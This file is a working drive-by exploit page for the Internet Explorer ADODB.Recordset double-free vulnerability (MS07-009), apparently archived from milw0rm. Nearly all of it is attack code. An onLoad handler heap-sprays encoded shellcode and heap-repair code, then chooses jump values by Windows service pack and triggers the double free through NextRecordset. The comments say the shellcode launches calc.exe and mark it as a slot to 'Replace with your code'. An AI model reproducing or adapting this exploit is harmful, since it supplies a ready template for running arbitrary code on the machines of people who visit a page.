@@ -1,0 +1,149 @@
+<HTML>
+<!--
+**********************************************************************************
+Microsoft Internet Explorer ADODB.Recordset Double Free Memory Exploit (ms07-009).
+**********************************************************************************
+Review:
+This code exploit "double free error" in msado15.dll NextRecordset() function.
+As a result of double freeing of same string, rewriting of Heap Control Block 
+by malicious data is occuring. 
+Technique of exploitation is based on "Lookaside remapping".
+Runs calc.exe if success.
+-->
+<HEAD>
+	<OBJECT id=obj classid=clsid:00000535-0000-0010-8000-00AA006D2EA4></OBJECT>
+</HEAD>
+
+<BODY onLoad='Go()'>
+
+<script language=javascript>
+
+//------------------Replace with your code-----------------------//
+	var Shellcode = unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
+//------------------Replace with your code-----------------------//
+
+
+//-------------Heap Repair Code. Do not Replace------------------//
+		var HeapRepairCode = unescape("%u9090%u9090%u186A%u645B%u038B%u408B%u8B30%u1840%u5805%u0001%u3300%u89D2%u8910%u0450%u5089%u8908%u0C50%uC083%u8928%u8900%u0440%uC083%u6608%u783D%u7C05%u8BF2%u81D8%u90C3%u0000%u8900%u3318%u83D2%u04C0%u1089%uC083%u8104%u80C3%u0000%u8900%u3318%u89C0%u8303%u04C3%u8166%u88FB%u7C1E%u8BF4%u81D3%u70EB%u001E%u6600%u338B%u8966%u4232%uC642%u0802%u6642%u328B%u3166%u4232%uC642%u1402%u6642%u328B%u3166%u4232%u6642%uC381%u0160%u1389%u5389%u8904%u891A%u045A%u9090");
+//-------------Heap Repair Code. Do not Replace------------------//
+
+var part1 = '';
+var part2 = '';
+var partLen = 127;
+
+function PrepMem()
+{
+//Standard Heap Spray Code
+var heapSprayToAddress = 0x05050505;
+
+	var payLoadCode = HeapRepairCode + Shellcode;
+	var heapBlockSize = 0x400000;
+	var payLoadSize = payLoadCode.length * 2;
+	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+	var spraySlide = unescape("%u9090%u9090");
+	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+	memory = new Array();
+
+	for (i=0;i<heapBlocks;i++)
+	{
+		memory[i] = spraySlide + payLoadCode;
+	}
+
+	function getSpraySlide(spraySlide, spraySlideSize)
+	{
+		while (spraySlide.length*2<spraySlideSize)
+		{
+			spraySlide += spraySlide;
+		}
+		spraySlide = spraySlide.substring(0,spraySlideSize/2);
+		return spraySlide;
+	}
+}
+
+
+function GetSystemVersion()
+{
+ //Simple Detecting of OS version out of Jscript version:
+		
+		var  ver = "";
+		ver += ScriptEngineMajorVersion();
+		ver += ScriptEngineMinorVersion();
+		ver += ScriptEngineBuildVersion();
+		
+		if 	( ver<568820 ){ return("preSP2"); }
+		else if ( ver<575730 ){ return("SP2"); }
+		else return (0);
+}
+
+
+function PrepJmpcode(sp)
+{
+	switch(sp){
+			case "preSP2":
+					
+					var egg="";
+					egg+=unescape("%u0608%u0014");		
+					egg+=unescape("%u0000%u0000");
+					egg+=unescape("%uF708%u0013");		
+					egg+=unescape("%u0000%u0101");
+					egg+=unescape("%uFFFF%uFFFF");
+					egg+=unescape("%uFFFF%uFFFF");
+					
+					part1+=unescape("%u0400%u0014");	
+					part1+=unescape("%u320C%u77FC");	
+					while (part1.length<partLen) {part1+=unescape("%u0505");}// ptr* shellcode							
+					
+					while (part2.length<(partLen-egg.length)) {part2+=unescape("%uFFFF");}
+					part2+=egg;						
+					
+					break;	
+
+		
+			case "SP2":
+					
+					var egg="";
+					egg+=unescape("%u0608%u0014");		
+					egg+=unescape("%u0000%u0000");
+					egg+=unescape("%uF708%u0013");		
+					egg+=unescape("%u0000%u0101");		
+					egg+=unescape("%uFFFF%uFFFF");
+					egg+=unescape("%uFFFF%uFFFF");
+					
+					part1+=unescape("%u0505%u0505");	
+					part1+=unescape("%ue128%u75c7");	
+					while (part1.length<partLen) {part1+=unescape("%uFFFF");}								
+					
+					while (part2.length<(partLen-egg.length)) {part2+=unescape("%uFFFF");}
+					part2+=egg;						
+					
+					break;	
+		}
+}
+
+function Exploit()
+{
+		var arr=new Array();
+		var i=1;
+		
+		while(i<500){
+				try{
+				k=1;
+				while(k<500){ arr[k]=part1+part2; k++; }
+				obj.NextRecordset( part1+part2 );
+				}catch(e){}
+				i++;
+					}
+}
+
+function Go(){
+	PrepMem();
+	PrepJmpcode( GetSystemVersion() );
+	Exploit();
+}
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2007-03-26]
